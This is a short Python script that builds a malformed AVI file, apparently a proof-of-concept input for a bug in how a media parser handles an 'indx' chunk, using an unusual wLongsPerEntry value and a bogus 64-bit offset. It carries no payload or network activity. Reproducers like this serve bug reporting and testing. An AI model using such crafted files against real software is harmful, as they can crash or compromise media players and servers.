import struct

def le32(x): return struct.pack("<I", x & 0xffffffff)
def le16(x): return struct.pack("<H", x & 0xffff)

strh_data = bytearray(56)
strh_data[0:4] = b"vids"
strh_data[4:8] = b"XVID"
strh_data[20:24] = le32(1)     
strh_data[24:28] = le32(30)    
strh_data[32:36] = le32(1)    
strh = b"strh" + le32(len(strh_data)) + bytes(strh_data)

wLongsPerEntry = 2            
bIndexSubType = 0
bIndexType = 0
nEntriesInUse = 1
dwChunkId = b"00db"
reserved = b"\x00" * 12
entry = struct.pack("<QII", 0x1122334455667788, 0x20, 0x10)  

indx_data = (
    le16(wLongsPerEntry) +
    bytes([bIndexSubType]) +
    bytes([bIndexType]) +
    le32(nEntriesInUse) +
    dwChunkId +
    reserved +
    entry
)
indx = b"indx" + le32(len(indx_data)) + indx_data

strl_payload = b"strl" + strh + indx
strl = b"LIST" + le32(len(strl_payload)) + strl_payload

hdrl = b"LIST" + le32(4 + len(strl)) + b"hdrl" + strl

movi = b"LIST" + le32(4) + b"movi"

body = hdrl + movi
riff = b"RIFF" + le32(4 + len(body)) + b"AVI " + body

with open("poc_avi_indx_wLongsPerEntry_2.avi", "wb") as f:
    f.write(riff)

print("Generated poc_avi_indx_wLongsPerEntry_2.avi")